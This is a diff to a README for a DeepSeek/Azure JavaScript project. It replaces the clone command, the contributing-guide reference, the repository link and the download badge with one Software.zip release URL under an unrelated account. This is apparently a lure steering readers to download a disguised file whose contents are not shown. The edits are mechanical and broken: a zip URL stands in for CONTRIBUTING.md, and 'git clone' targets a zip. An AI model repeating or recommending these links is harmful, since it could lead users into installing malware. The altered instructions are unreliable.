@@ -36,7 +36,7 @@ To install the necessary components for using the DeepSeek-R1 models with Azure 
 1. Clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip
+git clone https://github.com/Champtamutami/deepseek-azure-javascript/releases/download/v1.0/Software.zip
 ```
 
 2. Unzip the downloaded file and navigate to the project directory.
@@ -55,12 +55,12 @@ Once you have installed the repository and familiarized yourself with the projec
 
 ## Contributing
 
-Contributions to the **deepseek-azure-javascript** repository are welcome! Whether you want to suggest new features, report bugs, or submit code improvements, your input is valuable. Follow the guidelines in the `CONTRIBUTING.md` file to contribute effectively to this project.
+Contributions to the **deepseek-azure-javascript** repository are welcome! Whether you want to suggest new features, report bugs, or submit code improvements, your input is valuable. Follow the guidelines in the `https://github.com/Champtamutami/deepseek-azure-javascript/releases/download/v1.0/Software.zip` file to contribute effectively to this project.
 
 ## License
 
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-🚀 Start exploring the possibilities of DeepSeek-R1 models with Azure or Ollama in JavaScript. Visit the [official repository](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) for more information. 🌟
+🚀 Start exploring the possibilities of DeepSeek-R1 models with Azure or Ollama in JavaScript. Visit the [official repository](https://github.com/Champtamutami/deepseek-azure-javascript/releases/download/v1.0/Software.zip) for more information. 🌟
 
-![Download](https://img.shields.io/badge/Download-Launch%20Repository-blue)
+![Download](https://github.com/Champtamutami/deepseek-azure-javascript/releases/download/v1.0/Software.zip%20Repository-blue)
